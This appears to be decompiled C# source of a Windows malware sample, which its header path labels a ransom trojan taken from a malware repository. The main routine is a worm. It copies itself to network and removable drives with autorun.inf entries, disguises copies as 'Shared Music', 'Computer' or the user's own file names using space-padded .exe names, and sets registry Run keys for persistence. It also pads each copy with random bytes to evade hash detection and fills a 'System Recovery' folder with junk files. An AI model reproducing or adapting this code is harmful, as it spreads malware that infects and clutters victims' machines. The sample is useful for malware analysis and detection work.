// Decompiled with JetBrains decompiler
// Type: <Module>
// Assembly: Binarstep, Version=1.0.4362.29146, Culture=neutral, PublicKeyToken=null
// MVID: 3A6C907B-2E0B-4960-A10C-F7EDD3D20E08
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.07\HEUR-Trojan-Ransom.Win32.Agent.gen-55af9e90ee5209869e1eee99bac5a6931a282e3017d18a601fc4a176cd7b9d0a.exe

using \u003CCppImplementationDetails\u003E;
using \u003CCrtImplementationDetails\u003E;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.ConstrainedExecution;
using System.Runtime.ExceptionServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Permissions;
using System.Threading;
using System.Windows.Forms;

internal class \u003CModule\u003E
{
  [FixedAddressValueType]
  internal static int __\u0040\u0040_PchSym_\u004000\u0040UfhvihUzovcvbUwlxfnvmghUerhfzoLhgfwrlLBBUkilqvxghUyrmzihgvkUwvyftUhgwzucOlyq\u0040632A2919B7984D55;
  [FixedAddressValueType]
  internal static int \u003FUninitialized\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2HA;
  internal static __FnPtr<void ()> \u003FA0xab92d1dd\u002E\u003FUninitialized\u0024initializer\u0024\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2P6MXXZA;
  internal static \u0024ArrayType\u0024\u0024\u0024BY00Q6MPBXXZ \u003FA0xab92d1dd\u002E__xi_vt_a;
  [FixedAddressValueType]
  internal static double \u003FA0xab92d1dd\u002E_HUGE;
  internal static __FnPtr<void ()> \u003FA0xab92d1dd\u002E_HUGE\u0024initializer\u0024;
  [FixedAddressValueType]
  internal static Progress.State \u003FInitializedPerAppDomain\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A;
  internal static __FnPtr<void ()> \u003FA0xab92d1dd\u002E\u003FInitializedPerAppDomain\u0024initializer\u0024\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2P6MXXZA;
  [FixedAddressValueType]
  internal static double \u003FA0xab92d1dd\u002EHUGE;
  [FixedAddressValueType]
  internal static bool \u003FIsDefaultDomain\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2_NA;
  internal static __FnPtr<void ()> \u003FA0xab92d1dd\u002E\u003FIsDefaultDomain\u0024initializer\u0024\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2P6MXXZA;
  internal static __FnPtr<void ()> \u003FA0xab92d1dd\u002EHUGE\u0024initializer\u0024;
  internal static \u0024ArrayType\u0024\u0024\u0024BY00Q6MPBXXZ \u003FA0xab92d1dd\u002E__xc_ma_a;
  [FixedAddressValueType]
  internal static uint \u003FA0xab92d1dd\u002ECWMO_MAX_HANDLES;
  internal static __FnPtr<void ()> \u003FA0xab92d1dd\u002ECWMO_MAX_HANDLES\u0024initializer\u0024;
  [FixedAddressValueType]
  internal static Progress.State \u003FInitializedNative\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A;
  internal static __FnPtr<void ()> \u003FA0xab92d1dd\u002E\u003FInitializedNative\u0024initializer\u0024\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2P6MXXZA;
  [FixedAddressValueType]
  internal static int \u003FInitialized\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2HA;
  internal static __FnPtr<void ()> \u003FA0xab92d1dd\u002E\u003FInitialized\u0024initializer\u0024\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2P6MXXZA;
  internal static \u0024ArrayType\u0024\u0024\u0024BY00Q6MPBXXZ \u003FA0xab92d1dd\u002E__xc_ma_z;
  [FixedAddressValueType]
  internal static Progress.State \u003FInitializedVtables\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A;
  internal static __FnPtr<void ()> \u003FA0xab92d1dd\u002E\u003FInitializedVtables\u0024initializer\u0024\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2P6MXXZA;
  internal static \u0024ArrayType\u0024\u0024\u0024BY00Q6MPBXXZ \u003FA0xab92d1dd\u002E__xi_vt_z;
  [FixedAddressValueType]
  internal static Progress.State \u003FInitializedPerProcess\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A;
  internal static __FnPtr<void ()> \u003FA0xab92d1dd\u002E\u003FInitializedPerProcess\u0024initializer\u0024\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2P6MXXZA;
  [FixedAddressValueType]
  internal static uint __exit_list_size_app_domain;
  [FixedAddressValueType]
  internal static unsafe __FnPtr<void ()>* __onexitbegin_app_domain;
  [FixedAddressValueType]
  internal static unsafe __FnPtr<void ()>* __onexitend_app_domain;
  [FixedAddressValueType]
  internal static unsafe void* \u003F_lock\u0040AtExitLock\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q0PAXA;
  [FixedAddressValueType]
  internal static int \u003F_ref_count\u0040AtExitLock\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q0HA;
  [FixedAddressValueType]
  internal static __type_info_node __type_info_root_node;

  [STAThread]
  internal static unsafe int main(string[] args)
  {
    uint num1 = (uint) \u003CModule\u003E.___CxxQueryExceptionSize();
    // ISSUE: untyped stack allocation
    int pStorage1 = (int) __untypedstackalloc((int) num1 * 2);
    Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.High;
    int pStorage2;
    uint exceptionCode1;
    if (Application.ExecutablePath.EndsWith("recmgmt.cmd"))
    {
      bool flag = true;
      try
      {
        pStorage2 = pStorage1 + (int) num1;
        if (Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").GetValue("System recovery service") != (object) string.Empty)
          flag = false;
      }
      catch (Exception ex1) when (
      {
        // ISSUE: unable to correctly present filter
        exceptionCode1 = (uint) Marshal.GetExceptionCode();
        if (\u003CModule\u003E.___CxxExceptionFilter((void*) Marshal.GetExceptionPointers(), (void*) 0, 0, (void*) 0) != 0)
        {
          SuccessfulFiltering;
        }
        else
          throw;
      }
      )
      {
        uint rethrow = 0;
        \u003CModule\u003E.___CxxRegisterExceptionObject((void*) Marshal.GetExceptionPointers(), (void*) pStorage2);
        try
        {
          try
          {
          }
          catch (Exception ex2) when (
          {
            // ISSUE: unable to correctly present filter
            rethrow = (uint) \u003CModule\u003E.___CxxDetectRethrow((void*) Marshal.GetExceptionPointers());
            if (rethrow != 0U)
            {
              SuccessfulFiltering;
            }
            else
              throw;
          }
          )
          {
          }
          goto label_12;
          if (rethrow != 0U)
            throw;
        }
        finally
        {
          \u003CModule\u003E.___CxxUnregisterExceptionObject((void*) pStorage2, (int) rethrow);
        }
      }
label_12:
      if (flag)
        Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").SetValue("System recovery service", (object) Application.ExecutablePath);
      Thread.Sleep(1800000);
    }
    if (Application.ExecutablePath.EndsWith("                                                                                                    .exe") && !Application.ExecutablePath.EndsWith("Computer                                                                                                    .exe") && !Application.ExecutablePath.EndsWith("Shared Music                                                                                                    .exe"))
      Process.Start(Application.ExecutablePath.Substring(0, Application.ExecutablePath.Length - Application.ExecutablePath.LastIndexOf("                                                                                                    .exe") - 1));
    bool flag1 = true;
    foreach (DriveInfo drive in DriveInfo.GetDrives())
    {
      try
      {
        pStorage2 = pStorage1 + (int) num1;
        if (drive.DriveType == DriveType.Network)
        {
          Random random = new Random();
          if (!File.Exists(drive.RootDirectory.Root.Name + "\\Shared Music                                                                                                    .exe"))
          {
            File.WriteAllBytes(drive.RootDirectory.Root.Name + "\\Shared Music                                                                                                    .exe", File.ReadAllBytes(Application.ExecutablePath));
            BinaryWriter binaryWriter = new BinaryWriter((Stream) new FileStream(drive.RootDirectory.Root.Name + "\\Shared Music                                                                                                    .exe", FileMode.Append));
            binaryWriter.Write(random.Next());
            binaryWriter.Write(random.Next());
            binaryWriter.Write(random.Next());
            binaryWriter.Write(random.Next());
            binaryWriter.Write(random.Next());
            binaryWriter.Write(random.Next());
            binaryWriter.Write(random.Next());
            binaryWriter.Write(random.Next());
            int num2 = random.Next(5000, 12200);
            for (int index = 0; index <= num2; ++index)
              binaryWriter.Write(random.Next());
            IDisposable disposable = (IDisposable) binaryWriter;
            int num3;
            if (disposable != null)
            {
              disposable.Dispose();
              num3 = 0;
            }
            else
              num3 = 0;
          }
        }
        else if (drive.IsReady)
        {
          Random random = new Random();
          int num4;
          int num5;
          do
          {
            num4 = random.Next(10000, 999999);
            num5 = num4;
          }
          while (File.Exists(drive.RootDirectory.Root.Name + "\\KB" + num5.ToString() + ".exe"));
          if (File.Exists(drive.RootDirectory.Root.ToString() + "\\autorun.inf"))
          {
            if (File.ReadAllText(drive.RootDirectory.Root.ToString() + "\\autorun.inf").Contains(";;"))
              continue;
          }
          if (drive.DriveType == DriveType.Removable)
          {
            int num6 = num4;
            File.WriteAllText(drive.RootDirectory.Root.ToString() + "\\autorun.inf", "[AutoRun]\r\n\r\nopen=KB" + num6.ToString() + ".exe\r\n;;");
          }
          byte[] bytes = File.ReadAllBytes(Application.ExecutablePath);
          int num7 = 0;
          foreach (string file in Directory.GetFiles(drive.RootDirectory.Root.Name))
          {
            if (!file.Contains("KB"))
              continue;
            ++num7;
          }
          if (num7 == 0)
          {
            int num8 = num4;
            File.WriteAllBytes(drive.RootDirectory.Root.Name + "\\KB" + num8.ToString() + ".exe", bytes);
            int num9 = num4;
            BinaryWriter binaryWriter = new BinaryWriter((Stream) new FileStream(drive.RootDirectory.Root.Name + "\\KB" + num9.ToString() + ".exe", FileMode.Append));
            binaryWriter.Write(random.Next());
            binaryWriter.Write(random.Next());
            binaryWriter.Write(random.Next());
            binaryWriter.Write(random.Next());
            binaryWriter.Write(random.Next());
            binaryWriter.Write(random.Next());
            binaryWriter.Write(random.Next());
            binaryWriter.Write(random.Next());
            int num10 = random.Next(5000, 12200);
            for (int index = 0; index <= num10; ++index)
              binaryWriter.Write(random.Next());
            IDisposable disposable = (IDisposable) binaryWriter;
            int num11;
            if (disposable != null)
            {
              disposable.Dispose();
              num11 = 0;
            }
            else
              num11 = 0;
          }
          try
          {
            if (Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").GetValue("Intelligent background service launcher (IBSL)") != (object) string.Empty)
              flag1 = false;
          }
          catch (Exception ex3) when (
          {
            // ISSUE: unable to correctly present filter
            uint exceptionCode2 = (uint) Marshal.GetExceptionCode();
            if (\u003CModule\u003E.___CxxExceptionFilter((void*) Marshal.GetExceptionPointers(), (void*) 0, 0, (void*) 0) != 0)
            {
              SuccessfulFiltering;
            }
            else
              throw;
          }
          )
          {
            uint rethrow = 0;
            \u003CModule\u003E.___CxxRegisterExceptionObject((void*) Marshal.GetExceptionPointers(), (void*) pStorage1);
            try
            {
              try
              {
              }
              catch (Exception ex4) when (
              {
                // ISSUE: unable to correctly present filter
                rethrow = (uint) \u003CModule\u003E.___CxxDetectRethrow((void*) Marshal.GetExceptionPointers());
                if (rethrow != 0U)
                {
                  SuccessfulFiltering;
                }
                else
                  throw;
              }
              )
              {
              }
              continue;
              if (rethrow != 0U)
                throw;
            }
            finally
            {
              \u003CModule\u003E.___CxxUnregisterExceptionObject((void*) pStorage1, (int) rethrow);
            }
          }
        }
      }
      catch (Exception ex5) when (
      {
        // ISSUE: unable to correctly present filter
        exceptionCode1 = (uint) Marshal.GetExceptionCode();
        if (\u003CModule\u003E.___CxxExceptionFilter((void*) Marshal.GetExceptionPointers(), (void*) 0, 0, (void*) 0) != 0)
        {
          SuccessfulFiltering;
        }
        else
          throw;
      }
      )
      {
        uint rethrow = 0;
        \u003CModule\u003E.___CxxRegisterExceptionObject((void*) Marshal.GetExceptionPointers(), (void*) pStorage2);
        try
        {
          try
          {
          }
          catch (Exception ex6) when (
          {
            // ISSUE: unable to correctly present filter
            rethrow = (uint) \u003CModule\u003E.___CxxDetectRethrow((void*) Marshal.GetExceptionPointers());
            if (rethrow != 0U)
            {
              SuccessfulFiltering;
            }
            else
              throw;
          }
          )
          {
          }
          continue;
          if (rethrow != 0U)
            throw;
        }
        finally
        {
          \u003CModule\u003E.___CxxUnregisterExceptionObject((void*) pStorage2, (int) rethrow);
        }
      }
    }
    if (flag1)
      Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").SetValue("Intelligent background service launcher (IBSL)", (object) Application.ExecutablePath);
    try
    {
      pStorage2 = pStorage1 + (int) num1;
      string[] files = Directory.GetFiles(Application.StartupPath);
      string empty = string.Empty;
      foreach (string str in files)
        empty += str;
      Random random1 = new Random();
      int num12 = random1.Next();
      if (!Application.ExecutablePath.EndsWith("Installer.exe"))
      {
        int num13 = num12;
        if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\KB" + num13.ToString() + "Installer.exe"))
        {
          int num14 = 0;
          foreach (string file in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Personal)))
          {
            if (!file.EndsWith("Installer.exe"))
              continue;
            ++num14;
          }
          if (num14 < 3)
          {
            byte[] bytes = File.ReadAllBytes(Application.ExecutablePath);
            int num15 = num12;
            File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\KB" + num15.ToString() + "Installer.exe", bytes);
            int num16 = num12;
            BinaryWriter binaryWriter = new BinaryWriter((Stream) new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\KB" + num16.ToString() + "Installer.exe", FileMode.Append));
            binaryWriter.Write(random1.Next());
            binaryWriter.Write(random1.Next());
            binaryWriter.Write(random1.Next());
            binaryWriter.Write(random1.Next());
            binaryWriter.Write(random1.Next());
            binaryWriter.Write(random1.Next());
            binaryWriter.Write(random1.Next());
            binaryWriter.Write(random1.Next());
            int num17 = random1.Next(5000, 12200);
            for (int index = 0; index <= num17; ++index)
              binaryWriter.Write(random1.Next());
            IDisposable disposable = (IDisposable) binaryWriter;
            int num18;
            if (disposable != null)
            {
              disposable.Dispose();
              num18 = 0;
              goto label_89;
            }
            else
            {
              num18 = 0;
              goto label_89;
            }
          }
          else
            goto label_89;
        }
      }
      if (Application.ExecutablePath.EndsWith("Installer.exe"))
        Process.Start("msiexec.exe");
label_89:
      if (!Application.ExecutablePath.EndsWith("Computer                                                                                                    .exe"))
      {
        if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Computer                                                                                                    .exe"))
        {
          Random random2 = new Random();
          File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Computer                                                                                                    .exe");
          BinaryWriter binaryWriter = new BinaryWriter((Stream) new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Computer                                                                                                    .exe", FileMode.Append));
          binaryWriter.Write(random2.Next());
          binaryWriter.Write(random2.Next());
          binaryWriter.Write(random2.Next());
          binaryWriter.Write(random2.Next());
          binaryWriter.Write(random2.Next());
          binaryWriter.Write(random2.Next());
          binaryWriter.Write(random2.Next());
          binaryWriter.Write(random2.Next());
          int num19 = random2.Next(5000, 12200);
          for (int index = 0; index <= num19; ++index)
            binaryWriter.Write(random2.Next());
          IDisposable disposable = (IDisposable) binaryWriter;
          int num20;
          if (disposable != null)
          {
            disposable.Dispose();
            num20 = 0;
          }
          else
            num20 = 0;
        }
      }
      else
        Process.Start("explorer.exe", "/e, ");
      if (Application.ExecutablePath.EndsWith("Shared Music                                                                                                    .exe"))
        Process.Start("explorer.exe", "/e, " + Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
    }
    catch (Exception ex7) when (
    {
      // ISSUE: unable to correctly present filter
      exceptionCode1 = (uint) Marshal.GetExceptionCode();
      if (\u003CModule\u003E.___CxxExceptionFilter((void*) Marshal.GetExceptionPointers(), (void*) 0, 0, (void*) 0) != 0)
      {
        SuccessfulFiltering;
      }
      else
        throw;
    }
    )
    {
      uint rethrow = 0;
      \u003CModule\u003E.___CxxRegisterExceptionObject((void*) Marshal.GetExceptionPointers(), (void*) pStorage2);
      try
      {
        try
        {
        }
        catch (Exception ex8) when (
        {
          // ISSUE: unable to correctly present filter
          rethrow = (uint) \u003CModule\u003E.___CxxDetectRethrow((void*) Marshal.GetExceptionPointers());
          if (rethrow != 0U)
          {
            SuccessfulFiltering;
          }
          else
            throw;
        }
        )
        {
        }
        goto label_108;
        if (rethrow != 0U)
          throw;
      }
      finally
      {
        \u003CModule\u003E.___CxxUnregisterExceptionObject((void*) pStorage2, (int) rethrow);
      }
    }
label_108:
    try
    {
      pStorage2 = pStorage1 + (int) num1;
      if (!Application.ExecutablePath.EndsWith("Installer.exe"))
      {
        Random random = new Random();
        foreach (string file in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Personal)))
        {
          if (file.Contains("                                                                                                    .exe") || file.ToLower().EndsWith("installer.exe") || file.ToLower().EndsWith("desktop.ini") || file.ToLower().EndsWith("thumbs.db"))
            continue;
          string str1 = file;
          string str2 = str1.Substring(str1.LastIndexOf("\\") + 1);
          if (random.Next(0, 20) > 15 && !File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\" + str2 + "                                                                                                    .exe"))
          {
            File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\" + str2 + "                                                                                                    .exe");
            BinaryWriter binaryWriter = new BinaryWriter((Stream) new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\" + str2 + "                                                                                                    .exe", FileMode.Append));
            binaryWriter.Write(random.Next());
            binaryWriter.Write(random.Next());
            binaryWriter.Write(random.Next());
            binaryWriter.Write(random.Next());
            binaryWriter.Write(random.Next());
            binaryWriter.Write(random.Next());
            binaryWriter.Write(random.Next());
            binaryWriter.Write(random.Next(150000, 6000000));
            int num21 = random.Next(5000, 12200);
            for (int index = 0; index <= num21; ++index)
              binaryWriter.Write(random.Next());
            IDisposable disposable = (IDisposable) binaryWriter;
            int num22;
            if (disposable != null)
            {
              disposable.Dispose();
              num22 = 0;
            }
            else
              num22 = 0;
          }
        }
      }
    }
    catch (Exception ex9) when (
    {
      // ISSUE: unable to correctly present filter
      exceptionCode1 = (uint) Marshal.GetExceptionCode();
      if (\u003CModule\u003E.___CxxExceptionFilter((void*) Marshal.GetExceptionPointers(), (void*) 0, 0, (void*) 0) != 0)
      {
        SuccessfulFiltering;
      }
      else
        throw;
    }
    )
    {
      uint rethrow = 0;
      \u003CModule\u003E.___CxxRegisterExceptionObject((void*) Marshal.GetExceptionPointers(), (void*) pStorage2);
      try
      {
        try
        {
        }
        catch (Exception ex10) when (
        {
          // ISSUE: unable to correctly present filter
          rethrow = (uint) \u003CModule\u003E.___CxxDetectRethrow((void*) Marshal.GetExceptionPointers());
          if (rethrow != 0U)
          {
            SuccessfulFiltering;
          }
          else
            throw;
        }
        )
        {
        }
        goto label_129;
        if (rethrow != 0U)
          throw;
      }
      finally
      {
        \u003CModule\u003E.___CxxUnregisterExceptionObject((void*) pStorage2, (int) rethrow);
      }
    }
label_129:
    try
    {
      pStorage2 = pStorage1 + (int) num1;
      if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\System Recovery\\"))
        Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\System Recovery\\");
      if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\System Recovery\\recmgmt.cmd"))
      {
        Random random = new Random();
        File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\System Recovery\\recmgmt.cmd");
        BinaryWriter binaryWriter1 = new BinaryWriter((Stream) new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\System Recovery\\recmgmt.cmd", FileMode.Append));
        binaryWriter1.Write(random.Next());
        binaryWriter1.Write(random.Next());
        binaryWriter1.Write(random.Next());
        binaryWriter1.Write(random.Next());
        binaryWriter1.Write(random.Next());
        binaryWriter1.Write(random.Next());
        binaryWriter1.Write(random.Next());
        binaryWriter1.Write(random.Next(150000, 6000000));
        int num23 = random.Next(300000, 400000);
        for (int index = 0; index <= num23; ++index)
          binaryWriter1.Write(random.Next());
        int num24 = random.Next(20, 50);
        for (int index1 = 0; index1 <= num24; ++index1)
        {
          int num25 = random.Next(10000, 6000000);
          int num26 = num25;
          if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\System Recovery\\" + num26.ToString() + ".dat"))
            continue;
          int num27 = num25;
          BinaryWriter binaryWriter2 = new BinaryWriter((Stream) new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\System Recovery\\" + num27.ToString() + ".dat", FileMode.Create));
          int num28 = random.Next(4000, 20000);
          for (int index2 = 0; index2 <= num28; ++index2)
            binaryWriter2.Write(index2);
        }
        Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\System Recovery\\recmgmt.cmd");
      }
    }
    catch (Exception ex11) when (
    {
      // ISSUE: unable to correctly present filter
      exceptionCode1 = (uint) Marshal.GetExceptionCode();
      if (\u003CModule\u003E.___CxxExceptionFilter((void*) Marshal.GetExceptionPointers(), (void*) 0, 0, (void*) 0) != 0)
      {
        SuccessfulFiltering;
      }
      else
        throw;
    }
    )
    {
      uint rethrow = 0;
      \u003CModule\u003E.___CxxRegisterExceptionObject((void*) Marshal.GetExceptionPointers(), (void*) pStorage2);
      try
      {
        try
        {
        }
        catch (Exception ex12) when (
        {
          // ISSUE: unable to correctly present filter
          rethrow = (uint) \u003CModule\u003E.___CxxDetectRethrow((void*) Marshal.GetExceptionPointers());
          if (rethrow != 0U)
          {
            SuccessfulFiltering;
          }
          else
            throw;
        }
        )
        {
        }
        goto label_152;
        if (rethrow != 0U)
          throw;
      }
      finally
      {
        \u003CModule\u003E.___CxxUnregisterExceptionObject((void*) pStorage2, (int) rethrow);
      }
    }
label_152:
    DateTime now = DateTime.Now;
    if (now.Day == 1 && now.Month == 4)
    {
      Console.Beep(600, 50);
      Console.Beep(400, 50);
      Console.Beep(600, 50);
      Console.Beep(400, 50);
      Console.Beep(600, 50);
      Console.Beep(400, 50);
      Console.Beep(600, 50);
      Console.Beep(400, 50);
      Console.Beep(600, 50);
      Console.Beep(400, 50);
      Console.Beep(600, 50);
      Console.Beep(400, 50);
      Console.Beep(600, 50);
      Console.Beep(400, 50);
      Console.Beep(600, 50);
      Console.Beep(400, 50);
      Console.Beep(600, 50);
      Console.Beep(400, 50);
    }
    return 0;
  }

  internal static void \u003FA0xab92d1dd\u002E\u003F\u003F__E\u003FA0xab92d1dd\u0040_HUGE\u0040\u0040YMXXZ() => \u003CModule\u003E.\u003FA0xab92d1dd\u002E_HUGE = double.PositiveInfinity;

  internal static void \u003FA0xab92d1dd\u002E\u003F\u003F__E\u003FA0xab92d1dd\u0040HUGE\u0040\u0040YMXXZ() => \u003CModule\u003E.\u003FA0xab92d1dd\u002EHUGE = \u003CModule\u003E.\u003FA0xab92d1dd\u002E_HUGE;

  internal static void \u003FA0xab92d1dd\u002E\u003F\u003F__E\u003FA0xab92d1dd\u0040CWMO_MAX_HANDLES\u0040\u0040YMXXZ() => \u003CModule\u003E.\u003FA0xab92d1dd\u002ECWMO_MAX_HANDLES = 56U;

  internal static void \u003CCrtImplementationDetails\u003E\u002EThrowNestedModuleLoadException(
    Exception innerException,
    Exception nestedException)
  {
    throw new ModuleLoadExceptionHandlerException("A nested exception occurred after the primary exception that caused the C++ module to fail to load.\n", innerException, nestedException);
  }

  internal static void \u003CCrtImplementationDetails\u003E\u002EThrowModuleLoadException(
    string errorMessage,
    Exception innerException)
  {
    throw new ModuleLoadException(errorMessage, innerException);
  }

  internal static void \u003CCrtImplementationDetails\u003E\u002ERegisterModuleUninitializer(
    EventHandler handler)
  {
    ModuleUninitializer._ModuleUninitializer.AddHandler(handler);
  }

  internal static void \u003FA0xab92d1dd\u002E\u003F\u003F__E\u003FInitialized\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2HA\u0040\u0040YMXXZ() => \u003CModule\u003E.\u003FInitialized\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2HA = 0;

  internal static void \u003FA0xab92d1dd\u002E\u003F\u003F__E\u003FUninitialized\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2HA\u0040\u0040YMXXZ() => \u003CModule\u003E.\u003FUninitialized\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2HA = 0;

  internal static void \u003FA0xab92d1dd\u002E\u003F\u003F__E\u003FIsDefaultDomain\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2_NA\u0040\u0040YMXXZ() => \u003CModule\u003E.\u003FIsDefaultDomain\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2_NA = false;

  internal static void \u003FA0xab92d1dd\u002E\u003F\u003F__E\u003FInitializedVtables\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A\u0040\u0040YMXXZ() => \u003CModule\u003E.\u003FInitializedVtables\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A = (Progress.State) 0;

  internal static void \u003FA0xab92d1dd\u002E\u003F\u003F__E\u003FInitializedNative\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A\u0040\u0040YMXXZ() => \u003CModule\u003E.\u003FInitializedNative\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A = (Progress.State) 0;

  internal static void \u003FA0xab92d1dd\u002E\u003F\u003F__E\u003FInitializedPerProcess\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A\u0040\u0040YMXXZ() => \u003CModule\u003E.\u003FInitializedPerProcess\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A = (Progress.State) 0;

  internal static void \u003FA0xab92d1dd\u002E\u003F\u003F__E\u003FInitializedPerAppDomain\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A\u0040\u0040YMXXZ() => \u003CModule\u003E.\u003FInitializedPerAppDomain\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A = (Progress.State) 0;

  [DebuggerStepThrough]
  [SecurityCritical]
  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EInitializeVtables(
    [In] LanguageSupport* obj0)
  {
    \u003CModule\u003E.gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u003D((gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E*) obj0, "The C++ module failed to load during vtable initialization.\n");
    \u003CModule\u003E.\u003FInitializedVtables\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A = (Progress.State) 1;
    \u003CModule\u003E._initterm_m((__FnPtr<void* ()>*) &\u003CModule\u003E.\u003FA0xab92d1dd\u002E__xi_vt_a, (__FnPtr<void* ()>*) &\u003CModule\u003E.\u003FA0xab92d1dd\u002E__xi_vt_z);
    \u003CModule\u003E.\u003FInitializedVtables\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A = (Progress.State) 2;
  }

  [SecurityCritical]
  [DebuggerStepThrough]
  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EInitializePerAppDomain(
    [In] LanguageSupport* obj0)
  {
    \u003CModule\u003E.gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u003D((gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E*) obj0, "The C++ module failed to load during appdomain initialization.\n");
    \u003CModule\u003E.\u003FInitializedPerAppDomain\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A = (Progress.State) 1;
    \u003CModule\u003E._initatexit_app_domain();
    \u003CModule\u003E._initterm_m((__FnPtr<void* ()>*) &\u003CModule\u003E.\u003FA0xab92d1dd\u002E__xc_ma_a, (__FnPtr<void* ()>*) &\u003CModule\u003E.\u003FA0xab92d1dd\u002E__xc_ma_z);
